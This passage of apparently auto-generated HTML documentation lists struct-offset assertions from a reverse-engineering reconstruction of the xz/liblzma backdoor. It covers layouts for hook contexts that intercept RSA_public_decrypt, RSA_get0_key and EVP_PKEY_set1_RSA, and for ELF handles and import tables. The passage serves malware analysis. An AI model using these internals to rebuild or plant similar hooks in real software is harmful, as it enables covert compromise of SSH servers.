<tr class="memitem:ac0a88454c10f7b37078d956a0c4e5a8d"><td class="memItemLeft" align="right" valign="top"><a id="ac0a88454c10f7b37078d956a0c4e5a8d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, _dl_audit_symbind_alt, 0x100)</td></tr>
<tr class="separator:ac0a88454c10f7b37078d956a0c4e5a8d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a19c687b89a546054192f6416ac079890"><td class="memItemLeft" align="right" valign="top"><a id="a19c687b89a546054192f6416ac079890"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, _dl_audit_symbind_alt__size, 0x108)</td></tr>
<tr class="separator:a19c687b89a546054192f6416ac079890"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5ca5c4c3c86b75fe4665038d4e571fe7"><td class="memItemLeft" align="right" valign="top"><a id="a5ca5c4c3c86b75fe4665038d4e571fe7"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, hook_RSA_public_decrypt, 0x110)</td></tr>
<tr class="separator:a5ca5c4c3c86b75fe4665038d4e571fe7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a99de76b8a6318552cbc13b5204090642"><td class="memItemLeft" align="right" valign="top"><a id="a99de76b8a6318552cbc13b5204090642"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, hook_EVP_PKEY_set1_RSA, 0x118)</td></tr>
<tr class="separator:a99de76b8a6318552cbc13b5204090642"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a535afe04cbca3cd6b6873cd8bf13b977"><td class="memItemLeft" align="right" valign="top"><a id="a535afe04cbca3cd6b6873cd8bf13b977"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, hook_RSA_get0_key, 0x120)</td></tr>
<tr class="separator:a535afe04cbca3cd6b6873cd8bf13b977"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aac92a856eac31825a5c01b3960393485"><td class="memItemLeft" align="right" valign="top"><a id="aac92a856eac31825a5c01b3960393485"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, <a class="el" href="structimported__funcs.html">imported_funcs</a>, 0x128)</td></tr>
<tr class="separator:aac92a856eac31825a5c01b3960393485"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab832e987bb4d1ecb5c94d8c9f79dd07b"><td class="memItemLeft" align="right" valign="top"><a id="ab832e987bb4d1ecb5c94d8c9f79dd07b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, hooks_installed, 0x130)</td></tr>
<tr class="separator:ab832e987bb4d1ecb5c94d8c9f79dd07b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae1ff944e55f1cadc57ed0c0bf4d2f231"><td class="memItemLeft" align="right" valign="top"><a id="ae1ff944e55f1cadc57ed0c0bf4d2f231"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a>, <a class="el" href="structldso__ctx.html">ldso_ctx</a>, 0)</td></tr>
<tr class="separator:ae1ff944e55f1cadc57ed0c0bf4d2f231"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a7e22d7ecbc0b7ebd31dac291b2e7ec26"><td class="memItemLeft" align="right" valign="top"><a id="a7e22d7ecbc0b7ebd31dac291b2e7ec26"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a>, global_ctx, 0x138)</td></tr>
<tr class="separator:a7e22d7ecbc0b7ebd31dac291b2e7ec26"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afff0285496688cc297ddc763d1659248"><td class="memItemLeft" align="right" valign="top"><a id="afff0285496688cc297ddc763d1659248"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a>, <a class="el" href="structimported__funcs.html">imported_funcs</a>, 0x2A0)</td></tr>
<tr class="separator:afff0285496688cc297ddc763d1659248"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4fdb47fcbb89cffb9043d5606afa0325"><td class="memItemLeft" align="right" valign="top"><a id="a4fdb47fcbb89cffb9043d5606afa0325"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a>, <a class="el" href="structlibc__imports.html">libc_imports</a>, 0x4A8)</td></tr>
<tr class="separator:a4fdb47fcbb89cffb9043d5606afa0325"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a48a342782dc3da5956f0bce32b6d71a2"><td class="memItemLeft" align="right" valign="top"><a id="a48a342782dc3da5956f0bce32b6d71a2"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a>, shared, 0x30)</td></tr>
<tr class="separator:a48a342782dc3da5956f0bce32b6d71a2"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a25254cc6d73666c4b52a2146a09071ba"><td class="memItemLeft" align="right" valign="top"><a id="a25254cc6d73666c4b52a2146a09071ba"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a>, <a class="el" href="xzre_8h.html#a32c97a88bc607d3f2459f0d7d420099d">hooks_data_addr</a>, 0x38)</td></tr>
<tr class="separator:a25254cc6d73666c4b52a2146a09071ba"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af429ab9adae492354cb7959e8a0e0bba"><td class="memItemLeft" align="right" valign="top"><a id="af429ab9adae492354cb7959e8a0e0bba"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a>, symbind64, 0x40)</td></tr>
<tr class="separator:af429ab9adae492354cb7959e8a0e0bba"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a241474d2ed6902e60c42ce50cdba2a78"><td class="memItemLeft" align="right" valign="top"><a id="a241474d2ed6902e60c42ce50cdba2a78"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a>, hook_RSA_public_decrypt, 0x48)</td></tr>
<tr class="separator:a241474d2ed6902e60c42ce50cdba2a78"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ada9d6e7410ac46d52cd7da32b816d40c"><td class="memItemLeft" align="right" valign="top"><a id="ada9d6e7410ac46d52cd7da32b816d40c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a>, hook_RSA_get0_key, 0x50)</td></tr>
<tr class="separator:ada9d6e7410ac46d52cd7da32b816d40c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0b25e68f96fef005e33fd1f93f1cce3d"><td class="memItemLeft" align="right" valign="top"><a id="a0b25e68f96fef005e33fd1f93f1cce3d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__setup__params.html">backdoor_setup_params_t</a>, shared, 0x8)</td></tr>
<tr class="separator:a0b25e68f96fef005e33fd1f93f1cce3d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abe7e7d55dc6c030acf0c84a6cfa8ac7d"><td class="memItemLeft" align="right" valign="top"><a id="abe7e7d55dc6c030acf0c84a6cfa8ac7d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__setup__params.html">backdoor_setup_params_t</a>, hook_params, 0x10)</td></tr>
<tr class="separator:abe7e7d55dc6c030acf0c84a6cfa8ac7d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af5a94e874d57beee98370fe9e1cefd58"><td class="memItemLeft" align="right" valign="top"><a id="af5a94e874d57beee98370fe9e1cefd58"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__setup__params.html">backdoor_setup_params_t</a>, entry_ctx, 0x80)</td></tr>
<tr class="separator:af5a94e874d57beee98370fe9e1cefd58"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a30e2e711133deaa2b255596805d91662"><td class="memItemLeft" align="right" valign="top"><a id="a30e2e711133deaa2b255596805d91662"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">elf_handles_t</a>, main, 0x0)</td></tr>
<tr class="separator:a30e2e711133deaa2b255596805d91662"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad8bb70352cf385e9810f5ff5b9c0481d"><td class="memItemLeft" align="right" valign="top"><a id="ad8bb70352cf385e9810f5ff5b9c0481d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">elf_handles_t</a>, tmp, 0x8)</td></tr>
<tr class="separator:ad8bb70352cf385e9810f5ff5b9c0481d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a467cc299537ef2bec41b423f4b000e66"><td class="memItemLeft" align="right" valign="top"><a id="a467cc299537ef2bec41b423f4b000e66"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">elf_handles_t</a>, libc, 0x10)</td></tr>
<tr class="separator:a467cc299537ef2bec41b423f4b000e66"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1748b47f26bba5c9b40fd8bb0adb8c29"><td class="memItemLeft" align="right" valign="top"><a id="a1748b47f26bba5c9b40fd8bb0adb8c29"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">elf_handles_t</a>, liblzma, 0x18)</td></tr>
<tr class="separator:a1748b47f26bba5c9b40fd8bb0adb8c29"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a476822f11a5fce8a08806fb9e27324e1"><td class="memItemLeft" align="right" valign="top"><a id="a476822f11a5fce8a08806fb9e27324e1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">elf_handles_t</a>, libcrypto, 0x20)</td></tr>
<tr class="separator:a476822f11a5fce8a08806fb9e27324e1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9cbb5a77a83bd17fe1a3969899edf01b"><td class="memItemLeft" align="right" valign="top"><a id="a9cbb5a77a83bd17fe1a3969899edf01b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structmain__elf.html">main_elf_t</a>, <a class="el" href="structelf__handles.html">elf_handles</a>, 0x0)</td></tr>
<tr class="separator:a9cbb5a77a83bd17fe1a3969899edf01b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a06cc31db44e2af8eebb62e7f0287d696"><td class="memItemLeft" align="right" valign="top"><a id="a06cc31db44e2af8eebb62e7f0287d696"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structmain__elf.html">main_elf_t</a>, dynamic_linker_ehdr, 0x8)</td></tr>
<tr class="separator:a06cc31db44e2af8eebb62e7f0287d696"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a70b389c91d58960da1dfd8b0b8780848"><td class="memItemLeft" align="right" valign="top"><a id="a70b389c91d58960da1dfd8b0b8780848"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structmain__elf.html">main_elf_t</a>, __libc_stack_end, 0x10)</td></tr>
<tr class="separator:a70b389c91d58960da1dfd8b0b8780848"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad240914d1020a2c6cc4af519cf312dd9"><td class="memItemLeft" align="right" valign="top"><a id="ad240914d1020a2c6cc4af519cf312dd9"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a>, data, 0x0)</td></tr>
<tr class="separator:ad240914d1020a2c6cc4af519cf312dd9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2934e1fc87c15302b153d4cc15f1f9c4"><td class="memItemLeft" align="right" valign="top"><a id="a2934e1fc87c15302b153d4cc15f1f9c4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a98d97fcc51fcd4fdbc88e9cd1f0d4405">backdoor_data_handle_t</a>, <a class="el" href="structelf__handles.html">elf_handles</a>, 0x8)</td></tr>
<tr class="separator:a2934e1fc87c15302b153d4cc15f1f9c4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af352f2a1a6fe02696c84847b8b22b232"><td class="memItemLeft" align="right" valign="top"><a id="af352f2a1a6fe02696c84847b8b22b232"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structstring__item.html">string_item_t</a>, string_id, 0)</td></tr>
<tr class="separator:af352f2a1a6fe02696c84847b8b22b232"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a53d4dda2d80d1fc12a7092555beba489"><td class="memItemLeft" align="right" valign="top"><a id="a53d4dda2d80d1fc12a7092555beba489"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structstring__item.html">string_item_t</a>, func_start, 0x8)</td></tr>
<tr class="separator:a53d4dda2d80d1fc12a7092555beba489"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2824c1a253ee8e49df065590ebcdf28a"><td class="memItemLeft" align="right" valign="top"><a id="a2824c1a253ee8e49df065590ebcdf28a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structstring__item.html">string_item_t</a>, func_end, 0x10)</td></tr>
<tr class="separator:a2824c1a253ee8e49df065590ebcdf28a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa9a770c4990f74a15bc966a3e438bff5"><td class="memItemLeft" align="right" valign="top"><a id="aa9a770c4990f74a15bc966a3e438bff5"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structstring__item.html">string_item_t</a>, xref, 0x18)</td></tr>
<tr class="separator:aa9a770c4990f74a15bc966a3e438bff5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae9d90f49c0e37f93062bf2a5761699ae"><td class="memItemLeft" align="right" valign="top"><a id="ae9d90f49c0e37f93062bf2a5761699ae"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structstring__references.html">string_references_t</a>, entries, 0)</td></tr>
<tr class="separator:ae9d90f49c0e37f93062bf2a5761699ae"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac5e80dc08a6eb1a376410812c0feae22"><td class="memItemLeft" align="right" valign="top"><a id="ac5e80dc08a6eb1a376410812c0feae22"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, main_map, 0)</td></tr>
<tr class="separator:ac5e80dc08a6eb1a376410812c0feae22"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a91a1c0dbea4cf420e221a0cb2bf403e1"><td class="memItemLeft" align="right" valign="top"><a id="a91a1c0dbea4cf420e221a0cb2bf403e1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, dynamic_linker_map, 0x8)</td></tr>
<tr class="separator:a91a1c0dbea4cf420e221a0cb2bf403e1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a10bb954aaa78f8845d4a31edf731f313"><td class="memItemLeft" align="right" valign="top"><a id="a10bb954aaa78f8845d4a31edf731f313"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, liblzma_map, 0x10)</td></tr>
<tr class="separator:a10bb954aaa78f8845d4a31edf731f313"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3c3046b4e3cd83077072f55f42b0e7ab"><td class="memItemLeft" align="right" valign="top"><a id="a3c3046b4e3cd83077072f55f42b0e7ab"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, libcrypto_map, 0x18)</td></tr>
<tr class="separator:a3c3046b4e3cd83077072f55f42b0e7ab"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a90849f8226700f9fc9e8806123002876"><td class="memItemLeft" align="right" valign="top"><a id="a90849f8226700f9fc9e8806123002876"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, libsystemd_map, 0x20)</td></tr>
<tr class="separator:a90849f8226700f9fc9e8806123002876"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abb27d2315a6c64e5a8273d08e9073f13"><td class="memItemLeft" align="right" valign="top"><a id="abb27d2315a6c64e5a8273d08e9073f13"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, libc_map, 0x28)</td></tr>
<tr class="separator:abb27d2315a6c64e5a8273d08e9073f13"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa496711b73ba8684046af04317b727cf"><td class="memItemLeft" align="right" valign="top"><a id="aa496711b73ba8684046af04317b727cf"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, <a class="el" href="structelf__handles.html">elf_handles</a>, 0x30)</td></tr>
<tr class="separator:aa496711b73ba8684046af04317b727cf"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a260462b3ca60420fad0b46e3dc5c00a6"><td class="memItemLeft" align="right" valign="top"><a id="a260462b3ca60420fad0b46e3dc5c00a6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, main_info, 0x68)</td></tr>
<tr class="separator:a260462b3ca60420fad0b46e3dc5c00a6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2ec489765b21f8bdc8c92e590c0f7422"><td class="memItemLeft" align="right" valign="top"><a id="a2ec489765b21f8bdc8c92e590c0f7422"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, tmp_info, 0x168)</td></tr>
<tr class="separator:a2ec489765b21f8bdc8c92e590c0f7422"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2a4053fbbd30f6e722605f9b0a686ec4"><td class="memItemLeft" align="right" valign="top"><a id="a2a4053fbbd30f6e722605f9b0a686ec4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, libc_info, 0x268)</td></tr>
<tr class="separator:a2a4053fbbd30f6e722605f9b0a686ec4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad689576e1b53734ce16d9c110c52c6da"><td class="memItemLeft" align="right" valign="top"><a id="ad689576e1b53734ce16d9c110c52c6da"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, liblzma_info, 0x368)</td></tr>
<tr class="separator:ad689576e1b53734ce16d9c110c52c6da"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3fe5fa8a2a464ceeef178a3bfee0febb"><td class="memItemLeft" align="right" valign="top"><a id="a3fe5fa8a2a464ceeef178a3bfee0febb"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, libcrypto_info, 0x468)</td></tr>
<tr class="separator:a3fe5fa8a2a464ceeef178a3bfee0febb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acea945d4b1eb08cb3d5826e9bf5418ab"><td class="memItemLeft" align="right" valign="top"><a id="acea945d4b1eb08cb3d5826e9bf5418ab"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, <a class="el" href="structlibc__imports.html">libc_imports</a>, 0x568)</td></tr>
<tr class="separator:acea945d4b1eb08cb3d5826e9bf5418ab"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aca6d436cdf44b54819ddc0a99810cfe8"><td class="memItemLeft" align="right" valign="top"><a id="aca6d436cdf44b54819ddc0a99810cfe8"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, string_refs, 0x5D8)</td></tr>
<tr class="separator:aca6d436cdf44b54819ddc0a99810cfe8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a80339b10786531e6061e8087045c92d9"><td class="memItemLeft" align="right" valign="top"><a id="a80339b10786531e6061e8087045c92d9"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="xzre_8h.html#a78a513f8570845832aaf68c928a5126a">backdoor_data_t</a>, import_resolver, 0x950)</td></tr>
<tr class="separator:a80339b10786531e6061e8087045c92d9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac82e17a1f10bad69aa9680e89dae0fc1"><td class="memItemLeft" align="right" valign="top"><a id="ac82e17a1f10bad69aa9680e89dae0fc1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a>, data, 0x0)</td></tr>
<tr class="separator:ac82e17a1f10bad69aa9680e89dae0fc1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3d720c43910725c7479e25f27f309da4"><td class="memItemLeft" align="right" valign="top"><a id="a3d720c43910725c7479e25f27f309da4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a>, <a class="el" href="structelf__handles.html">elf_handles</a>, 0x8)</td></tr>
<tr class="separator:a3d720c43910725c7479e25f27f309da4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a31e98f956a800bd4a1225bf55a3aa330"><td class="memItemLeft" align="right" valign="top"><a id="a31e98f956a800bd4a1225bf55a3aa330"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a>, RSA_public_decrypt_plt, 0x10)</td></tr>
<tr class="separator:a31e98f956a800bd4a1225bf55a3aa330"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3efdae1a777a083bfa07e08ce43d0067"><td class="memItemLeft" align="right" valign="top"><a id="a3efdae1a777a083bfa07e08ce43d0067"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a>, EVP_PKEY_set1_RSA_plt, 0x18)</td></tr>
<tr class="separator:a3efdae1a777a083bfa07e08ce43d0067"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae70d01b72cb58a9864222197718b4ced"><td class="memItemLeft" align="right" valign="top"><a id="ae70d01b72cb58a9864222197718b4ced"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a>, RSA_get0_key_plt, 0x20)</td></tr>
<tr class="separator:ae70d01b72cb58a9864222197718b4ced"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae30af5ee4b4881644582687ab91b3a26"><td class="memItemLeft" align="right" valign="top"><a id="ae30af5ee4b4881644582687ab91b3a26"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a>, <a class="el" href="xzre_8h.html#a32c97a88bc607d3f2459f0d7d420099d">hooks_data_addr</a>, 0x28)</td></tr>
<tr class="separator:ae30af5ee4b4881644582687ab91b3a26"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1451f92c8f0cf7451ffdb8dfcd799742"><td class="memItemLeft" align="right" valign="top"><a id="a1451f92c8f0cf7451ffdb8dfcd799742"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a>, <a class="el" href="structlibc__imports.html">libc_imports</a>, 0x30)</td></tr>
<tr class="separator:a1451f92c8f0cf7451ffdb8dfcd799742"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa970c4ef889a63da65319360b6b6a320"><td class="memItemLeft" align="right" valign="top"><a id="aa970c4ef889a63da65319360b6b6a320"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structcmd__arguments.html">cmd_arguments_t</a>, flags1, 0)</td></tr>
<tr class="separator:aa970c4ef889a63da65319360b6b6a320"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa105d857f1825e66aefd1bd84435b0fe"><td class="memItemLeft" align="right" valign="top"><a id="aa105d857f1825e66aefd1bd84435b0fe"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structcmd__arguments.html">cmd_arguments_t</a>, flags2, 1)</td></tr>
<tr class="separator:aa105d857f1825e66aefd1bd84435b0fe"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5d71b89283fd8e1451188363f58a92b7"><td class="memItemLeft" align="right" valign="top"><a id="a5d71b89283fd8e1451188363f58a92b7"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structcmd__arguments.html">cmd_arguments_t</a>, flags3, 2)</td></tr>
<tr class="separator:a5d71b89283fd8e1451188363f58a92b7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a16de0e7a5abbf7a012e59994f0f28d57"><td class="memItemLeft" align="right" valign="top"><a id="a16de0e7a5abbf7a012e59994f0f28d57"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structcmd__arguments.html">cmd_arguments_t</a>, u, 3)</td></tr>
<tr class="separator:a16de0e7a5abbf7a012e59994f0f28d57"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a055d1ce09965d2f3689da06cc5fd571a"><td class="memItemLeft" align="right" valign="top"><a id="a055d1ce09965d2f3689da06cc5fd571a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structkey__ctx.html">key_ctx_t</a>, rsa_n, 0)</td></tr>
<tr class="separator:a055d1ce09965d2f3689da06cc5fd571a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab48eb190c7fc951ac7c45a0d24b8af42"><td class="memItemLeft" align="right" valign="top"><a id="ab48eb190c7fc951ac7c45a0d24b8af42"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structkey__ctx.html">key_ctx_t</a>, rsa_e, 0x8)</td></tr>
<tr class="separator:ab48eb190c7fc951ac7c45a0d24b8af42"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1c5b1c41fec212ccd3b23bf8976e8eb1"><td class="memItemLeft" align="right" valign="top"><a id="a1c5b1c41fec212ccd3b23bf8976e8eb1"></a>
